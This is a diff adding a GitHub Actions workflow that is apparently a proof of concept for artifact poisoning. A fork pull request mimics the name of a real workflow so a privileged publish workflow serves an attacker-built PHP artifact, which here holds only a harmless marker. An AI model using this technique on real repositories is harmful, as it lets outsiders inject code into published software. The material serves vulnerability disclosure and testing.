@@ -1,0 +1,27 @@
+name: Playground Preview
+
+# Attacker-controlled workflow placed in a fork PR. It has the same *name* as
+# the real .github/workflows/playground-preview.yml, which is all the
+# workflow_run trigger in playground-preview-publish.yml matches on.
+
+on:
+  pull_request:
+
+jobs:
+  forge-artifact:
+    runs-on: ubuntu-24.04
+    permissions:
+      contents: read
+    steps:
+      - name: Build attacker-chosen "release-assets" artifact
+        run: |
+          set -euo pipefail
+          mkdir -p payload
+          printf '%s\n' '<?php // POC-ARBITRARY-CONTENT-FROM-FORK served by the privileged publish workflow' > payload/wp-graphql-content-blocks.php
+          (cd payload && zip -q ../wp-graphql-content-blocks.zip wp-graphql-content-blocks.php)
+          ls -l wp-graphql-content-blocks.zip
+      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
+        with:
+          name: release-assets
+          path: wp-graphql-content-blocks.zip
+          if-no-files-found: error
